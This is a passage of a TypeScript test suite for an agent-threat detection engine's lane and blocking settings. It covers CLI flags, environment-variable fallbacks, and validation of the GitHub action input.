          json = JSON.parse(stdout.slice(start)) as Record<string, unknown>;
        } catch {
          json = null;
        }
      }
      return { status: r.status ?? -1, json, stdout, stderr: r.stderr ?? '' };
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }

  /** Rule ids anywhere in the scan's JSON output. */
  const firedRules = (json: Record<string, unknown> | null): string[] =>
    [...JSON.stringify(json ?? {}).matchAll(/ATR-\d{4}-\d{5}/g)].map((m) => m[0]!);

  it('fires a maturity=test rule in the default lane', () => {
    const { status, json, stderr } = runScan([]);
    expect(status, stderr).toBe(0);
    // CONTROL for every "did not fire" assertion below: the fixture, the events
    // file and the JSON shape all work, so an empty result later is the lane.
    expect(firedRules(json)).toContain(RULE_ID);
  });

  it('--lane enforce keeps it from firing; --lane hunt lets it fire', () => {
    expect(firedRules(runScan(['--lane', 'enforce']).json)).not.toContain(RULE_ID);
    expect(firedRules(runScan(['--lane', 'alert']).json)).toContain(RULE_ID);
    expect(firedRules(runScan(['--lane', 'hunt']).json)).toContain(RULE_ID);
  });

  it('reads ATR_LANE, and --lane overrides it', () => {
    // The engine no longer reads ATR_LANE, so this passes only because the CLI
    // resolves it and hands the result to ATREngine explicitly.
    expect(firedRules(runScan([], { ATR_LANE: 'enforce' }).json)).not.toContain(RULE_ID);
    expect(
      firedRules(runScan(['--lane', 'hunt'], { ATR_LANE: 'enforce' }).json)
    ).toContain(RULE_ID);
  });

  it('accepts ATR_LANE=ENFORCE, which used to fall back to hunt in silence', () => {
    expect(firedRules(runScan([], { ATR_LANE: 'ENFORCE' }).json)).not.toContain(RULE_ID);
  });

  it('exits 1 on a misspelled --lane instead of quietly scanning in hunt', () => {
    const { status, stderr } = runScan(['--lane', 'enfroce']);
    expect(status).toBe(1);
    expect(stderr).toContain('Invalid --lane');
  });

  it('warns but still scans when ATR_LANE is misspelled', () => {
    const { status, json, stderr } = runScan([], { ATR_LANE: 'enfroce' });
    expect(status, stderr).toBe(0);
    expect(stderr).toContain('ATR_LANE');
    expect(firedRules(json)).toContain(RULE_ID);
  });
});

describe('action.yml lane input', () => {
  // The composite action cannot be executed here, so this reads the shipped
  // action.yml and (a) executes its validation fragment for real under sh,
  // (b) checks the input is actually threaded into the `atr scan` invocation.
  // Without this, deleting the `lane:` input left 1027 tests green.
  const actionYml = readFileSync(
    new URL('../action.yml', import.meta.url).pathname,
    'utf8'
  );

  it('declares a lane input whose default is a real lane', () => {
    expect(actionYml).toMatch(/^\s{2}lane:/m);
    const defaultLane = /^\s{2}lane:[\s\S]*?default:\s*'([^']+)'/m.exec(actionYml)?.[1];
    expect(defaultLane).toBe(DEFAULT_LANE);
    expect(parseLane(defaultLane!)).toBe(DEFAULT_LANE);
  });

  it('threads the input into the environment and on to `atr scan --lane`', () => {
    expect(actionYml).toContain('ATR_SCAN_LANE: ${{ inputs.lane }}');
    expect(actionYml).toMatch(/--lane "\$ATR_SCAN_LANE"/);
  });

  it('its validation fragment accepts every lane and rejects a typo', () => {
    // Extract the real `case` statement and run it, rather than trusting that a
    // string containing "enforce|alert|hunt" behaves like one.
    const fragment = /case "\$ATR_SCAN_LANE" in[\s\S]*?esac/.exec(actionYml)?.[0];
    expect(fragment).toBeDefined();

    const run = (value: string) =>
      spawnSync('sh', ['-c', `ATR_SCAN_LANE='${value}'\n${fragment}`], {
        encoding: 'utf8',
        timeout: 30_000,
      });

    for (const lane of ['enforce', 'alert', 'hunt']) {
      expect(run(lane).status, `lane ${lane} should be accepted`).toBe(0);
    }
    const bad = run('enfroce');
    expect(bad.status).toBe(1);
    expect(bad.stdout + bad.stderr).toContain('Invalid lane');
  });
});

describe('a typo in the environment degrades the CLI, it does not kill it', () => {
  // WHY DEGRADE RATHER THAN EXIT — measured, not reasoned.
  //
  // `atr init` installs `atr guard` as a Claude Code PreToolUse *command* hook.
  // In the Claude Code 2.1.76 hook dispatcher, a command hook's exit status is
  // mapped: 0 -> hook_success (renderer returns null), 2 -> hook_blocking_error
  // (stderr shown AND the tool blocked), anything else -> hook_non_blocking_error,
  // where the tool RUNS, the attachment maps to [] for the model, and the
  // renderer prints exactly "<hookName> hook error" without the stderr text.
  //
  // So exiting non-zero over a typo loses every detection for that call, lets
  // the tool run anyway, and tells the operator nothing. The only loud status
  // is 2, which blocks the tool outright — a stray shell variable must not do
  // that. Degrading keeps detection and reports the problem where a human
  // running the command can see it.
  //
  // The cost, stated: an operator can believe enforcement is on when it is not.
  // That is why every note must be printed, and why the degraded posture is
  // advisory — the failure mode is "ATR does not act", never "ATR acts wrongly".

  it('an unparseable ATR_LANE falls back to hunt and says so', () => {
    const policy = resolveEnforcementPolicy({}, { ATR_LANE: 'enfroce' });
    expect(policy.lane).toBe('hunt');
    expect(policy.notes.join(' ')).toContain('enfroce');
    expect(policy.notes.join(' ')).toContain('ATR_LANE');
  });

  it('an unparseable ATR_BLOCKING falls back to off and says it is NOT enabled', () => {
    const policy = resolveEnforcementPolicy({}, { ATR_BLOCKING: 'enabled' });
    expect(policy.blocking).toBe(false);
    // The operator asked for enforcement and is not getting it. Say so.
    expect(policy.notes.join(' ')).toContain('NOT enabled');
  });

  // The fallback lane is the WIDEST one. Blocking on it would enforce using
  // maturities the operator never chose — the fallback direction landing on the
  // dangerous side, which is the whole reason this rule exists.
  it('an unreadable lane forces blocking off, even against an explicit --blocking', () => {
    const viaEnv = resolveEnforcementPolicy({}, { ATR_LANE: 'enfroce', ATR_BLOCKING: '1' });
    expect(viaEnv.lane).toBe('hunt');
    expect(viaEnv.blocking).toBe(false);
    expect(viaEnv.notes.join(' ')).toContain('Blocking disabled');

    const viaFlag = resolveEnforcementPolicy({ blocking: true }, { ATR_LANE: 'enfroce' });
    expect(viaFlag.blocking).toBe(false);
    expect(viaFlag.notes.join(' ')).toContain('Blocking disabled');

    // CONTROL: with a READABLE lane the same explicit flag is honoured, so the
    // clause above is the lane failure talking and not a blanket override.
    const clean = resolveEnforcementPolicy({ blocking: true }, { ATR_LANE: 'enforce' });
    expect(clean.blocking).toBe(true);
    expect(clean.lane).toBe('enforce');
    expect(clean.notes).toEqual([]);
  });

  it('a bad FLAG still throws — that is the caller, not the shell', () => {
    expect(() => resolveEnforcementPolicy({ lane: 'enfroce' as never }, {})).toThrow(TypeError);
    expect(() =>
      resolveEnforcementPolicy({ blocking: 'false' as unknown as boolean }, {})
    ).toThrow(TypeError);
  });

  it('a clean environment produces no notes at all', () => {
    const policy = resolveEnforcementPolicy({}, {});
    expect(policy).toMatchObject({ lane: DEFAULT_LANE, blocking: DEFAULT_BLOCKING });
    expect(policy.notes).toEqual([]);
  });

  // Replaces a test that claimed to construct an engine "under a typo'd
  // ATR_LANE" while never setting ATR_LANE — the file-level beforeEach had just
  // deleted it, so the premise in the name was never established and the test
  // passed whatever the constructor did. The engine no longer reads the
  // environment at all, so the honest version asserts exactly that: a typo'd
  // value is present, and it changes nothing.
  it('a typo in ATR_LANE cannot reach the engine constructor at all', async () => {
    process.env['ATR_LANE'] = 'enfroce';
    expect(process.env['ATR_LANE']).toBe('enfroce');
    expect(parseLane(process.env['ATR_LANE']!)).toBeNull(); // genuinely invalid

    const engine = new ATREngine({ rules: [fixtureRule()] });
    await engine.loadRules();
    expect(engine.getLane()).toBe('hunt');
    // Non-trivial: the engine is live and detecting, not merely "did not throw".
    expect(engine.evaluate(markerEvent()).length).toBeGreaterThan(0);
  });
});
